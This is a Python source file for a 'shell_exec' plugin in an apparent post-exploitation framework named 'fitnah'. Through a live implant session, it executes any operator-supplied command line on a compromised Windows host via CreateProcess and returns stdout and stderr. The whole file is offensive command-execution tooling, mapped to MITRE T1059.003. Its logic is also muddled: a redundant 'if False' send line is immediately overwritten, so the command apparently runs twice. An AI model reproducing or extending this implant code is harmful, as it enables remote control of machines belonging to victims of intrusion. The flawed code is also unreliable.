"""execution/shell_exec — native shell command via implant cmd_exec (CreateProcess, no cmd.exe). MITRE T1059.003"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ShellExec(BasePlugin):
    NAME        = "shell_exec"
    DESCRIPTION = "Run a shell command via CreateProcess (no cmd.exe wrapper). Captures stdout/stderr."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1059.003"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("cmd",     str, required=True,  help="Command line to execute"),
        Param("timeout", int, required=False, default=30, help="Seconds to wait (default 30)"),
    )

    @mitre("T1059.003")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        cmd     = params["cmd"]
        timeout = int(params.get("timeout", 30))
        r = ctx.send("shell", {"cmd": cmd}, ) if False else ctx.send("shell", {"cmd": cmd})
        # Use native exec (CreateProcess, no cmd.exe)
        r = ctx.exec(cmd)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
